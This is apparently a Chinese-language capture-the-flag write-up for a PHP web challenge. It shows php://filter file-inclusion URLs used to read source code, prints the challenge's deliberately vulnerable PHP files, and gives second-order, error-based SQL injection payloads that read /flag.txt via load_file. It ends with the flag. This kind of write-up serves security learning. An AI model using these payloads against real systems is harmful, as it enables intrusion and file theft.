---
title: "CTF-Ciscn-cyberpunk"
date: "2024-09-12"
description: ""
---

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240911104335.png)

看了半天发现就四个功能 添加 删除 查找 确认 并且参数很多一眼感觉就是sql 注入。  
但是源码里面有一个?file 很难不怀疑文件包含。  
因此读取对应的源码文件。利用了filter

```shell
?file=php://filter/convert.base64-encode/resource=index.php?file=php://filter/convert.base64-encode/resource=change.php?file=php://filter/convert.base64-encode/resource=confirm.php?file=php://filter/convert.base64-encode/resource=delete.php?file=php://filter/convert.base64-encode/resource=search.php
```

\*\*index.php

```php
<?phpini_set('open_basedir', '/var/www/html/');// $file = $_GET["file"];$file = (isset($_GET['file']) ? $_GET['file'] : null);if (isset($file)){    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {        echo('no way!');        exit;    }    @include($file);}?>
```

\*\*search.php

```php
<?phprequire_once "config.php"; if(!empty($_POST["user_name"]) && !empty($_POST["phone"])){    $msg = '';    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';    $user_name = $_POST["user_name"];    $phone = $_POST["phone"];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = 'no sql inject!';    }else{        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";        $fetch = $db->query($sql);    }    if (isset($fetch) && $fetch->num_rows>0){        $row = $fetch->fetch_assoc();        if(!$row) {            echo 'error';            print_r($db->error);            exit;        }        $msg = "<p>å§å:".$row['user_name']."</p><p>, çµè¯:".$row['phone']."</p><p>, å°å:".$row['address']."</p>";    } else {        $msg = "æªæ¾å°è®¢å!";    }}else {    $msg = "ä¿¡æ¯ä¸å¨";}?>
```

不做其他的文件读取，只读一下change文件  
\*\*\*change.php

```php
<?phprequire_once "config.php";if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"])){    $msg = '';    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';    $user_name = $_POST["user_name"];    $address = addslashes($_POST["address"]);    $phone = $_POST["phone"];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){        $msg = 'no sql inject!';    }else{        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";        $fetch = $db->query($sql);    }    if (isset($fetch) && $fetch->num_rows>0){        $row = $fetch->fetch_assoc();        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];        $result = $db->query($sql);        if(!$result) {            echo 'error';            print_r($db->error);            exit;        }        $msg = "è®¢åä¿®æ¹æå";    } else {        $msg = "æªæ¾å°è®¢å!";    }}else {    $msg = "ä¿¡æ¯ä¸å¨";}?>
```

看一下gpt的解释对应的数据库查询结果  
`$row = $fetch->fetch_assoc();` 这一行代码在 PHP 中用于处理 MySQL 数据库查询结果，具体解释如下：

1.  **`$fetch`**: 这是一个 `mysqli_result` 对象，通常是通过执行 SQL 查询获得的。这个对象包含了查询结果的所有行。
    
2.  **`fetch_assoc()`**: 这是 `mysqli_result` 类中的一个方法。调用这个方法会从结果集中取出下一行数据，并将其作为一个关联数组返回。关联数组的键是列名，值是对应列的值。
    
3.  **`$row`**: 这个变量用来保存 `fetch_assoc()` 方法返回的关联数组。如果没有更多的行可以取出，`fetch_assoc()` 方法会返回 `NULL`。
    

可以看到对于变量来讲除了address 没有进行一个黑名单。而只是用了函数

1.  **`addslashes()`**: 这是 PHP 中的一个函数，用于对字符串中的特定字符进行转义。它在字符串中的以下字符前面添加反斜杠（`\`）：
    
    *   单引号 (`'`)
    *   双引号 (`"`)
    *   反斜杠 (`\`)
    *   NULL 字符 (`\0`)
    
    这个函数通常用于保护 SQL 查询中的数据，避免 SQL 注入攻击，尤其是当你使用旧的 MySQL 函数（如 `mysql_query()`）时。  
    此时可以看见转义,但其实这个也非常的可怕。因为很难搞我们无法拼接。之前写过一篇文章，二次注入，十分符合这个场景。首先输入一个参数，由于转义我们无法使用因此我们只能先存进数据库。等待二次操作。刚好这个题目有一个change的而此操作。
    

读一下对应的change的二次操作。 但是目前有个问题就是我们的 $address = addslashes()这个函数,它是转义之后也会放入这个数据库中。

```php
'".$row['address']."'
```

看似有一个双引号其实 取完数据库的值之后双引号就会消失。 那么就是’address’  
因此完全符合二次注入

payload

```sql
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,60)),0x7e),1)#
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240911204627.png)  
爽了，直接一个报错注入。

flag{e8f2a64c-b8bc-4500-86f1-8834f14cb98e5}
